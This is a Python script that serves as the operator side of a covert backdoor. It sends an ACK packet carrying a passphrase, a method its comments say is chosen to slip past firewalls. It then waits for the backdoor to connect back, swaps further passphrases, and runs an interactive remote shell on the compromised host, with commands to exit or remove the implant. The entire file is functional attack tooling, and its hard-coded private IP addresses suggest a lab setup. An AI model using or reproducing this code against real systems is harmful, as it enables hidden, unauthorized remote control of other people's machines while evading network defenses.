#!/usr/bin/python3

import sys, socket, logging
from scapy.all import *

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

TIMEOUT = 3
MAXSIZE = 65535
BUFSIZE = 1024
prompt = ""
username = ""
sep = ""

# localHost = input("Local Host IP: ")
# localPort = int(input("Local Port Number: "))
# remoteHost = input("Backdoor Host IP: ")
# remotePort = int(input("Backdoor Port Number: "))

localHost = "192.168.0.24"
localPort = 80
remoteHost = "192.168.0.23"
remotePort = 80

# Use ACK packet instead of SYN packet because the chance of
# triggering the firewall
# 3 attempts to connect to the Backdoor
def Request(localHost, localPort, remoteHost, remotePort):
    global prompt
    global username
    global sep
    nAttempts = 3
    while nAttempts > 0:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Reuse a socket even it recently closed and is timing.
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.settimeout(TIMEOUT)
        sock.bind((localHost, localPort))
        sock.listen(1)
        packet = IP(src=localHost, dst=remoteHost)/TCP(sport=localPort, dport=remotePort, flags="A")/Raw(load="passphrase1")
        send(packet, verbose=0)
        try:
            conn, addr = sock.accept()
            host = addr[0]
            port = addr[1]
            if host == remoteHost or port == remotePort:
                break
            else:
                sock.close()
                nAttempts -= 1
                print("WARNING: Received unauthorized connection request... Connection refused")

            if nAttempts == 0:
                raise socket.timeout()
            conn.sendall(b"passphrase2")
            passphrase = conn.recv(BUFSIZE)
            while True:
                if type(passphrase) == bytes:
                    passphrase = passphrase.decode("utf-8")
                if passphrase == "passphrase3":
                    conn.sendall(b"Report")
                    user = conn.recv(BUFSIZE)
                    if type(user) == bytes:
                        user = user.decode("utf-8")
                    conn.sendall(b"Location")
                    location = conn.recv(BUFSIZE)
                    if type(location) == bytes:
                        location = location.decode("utf-8")
                    username = user[:len(user) - 1]
                    sep = user[len(user) - 1]
                    prompt = username + location + prompt
                    print("Success: connected")
                    return sock, conn
                else:
                    sock.close()
                    conn.close()
                    return None, None
        except socket.timeout:
            if nAttempts == 0:
                sock.close()
                print("ERROR: No answer from the backdoor")
                return None, None
            sock.close()
            nAttempts -= 1
            print("ERROR: Timeout... retrying")
        except (KeyboardInterrupt, SystemExit):
            sock.close()
            print("ERROR: User keyboard interruption")
            return None, None

def SendCommand(conn, command):
    conn.sendall(str.encode(command))
    response = conn.recv(MAXSIZE)
    if type(response) == bytes:
        response = response.decode("utf-8")
    return response

def ConnectBackdoor(localHost, localPort, remoteHost, remotePort):
    global prompt, username, sep
    try:
        sock, conn = Request(localHost, localPort, remoteHost, remotePort)
        if sock != None and conn != None:
            try:
                while True:
                    command = input(prompt+" ")
                    if command != "":
                        output = SendCommand(conn, command)
                        if command.split()[0] == "cd":
                            if len(output.split()) == 1:
                                prompt = username + output + sep
                            else:
                                print(output)
                        elif output.lower() == "exited":
                            print("Success: Backdoor closed")
                            break
                        elif output.lower() == "released":
                            print("Success: Backdoor removed")
                            break
                        else:
                            if output.lower() != "daemonnoreport":
                                print(output)
                    else:
                        continue
            except (KeyboardInterrupt, SystemExit):
                output = SendCommand(conn, "exit")
                if output.lower() == "exited":
                    print("Success: Done")
            except Exception as err:
                print(err.args)
                print("ERROR: Something went wrong")
                output = SendCommand(conn, "exit")
                if output.lower() == "exited":
                    print("Success: Backdoor closed")
            finally:
                conn.close()
                sock.close()
    except TypeError:
        print("ERROR: Cannot connect to the backdoor")
        sys.exit(1)

ConnectBackdoor(localHost, localPort, remoteHost, remotePort)
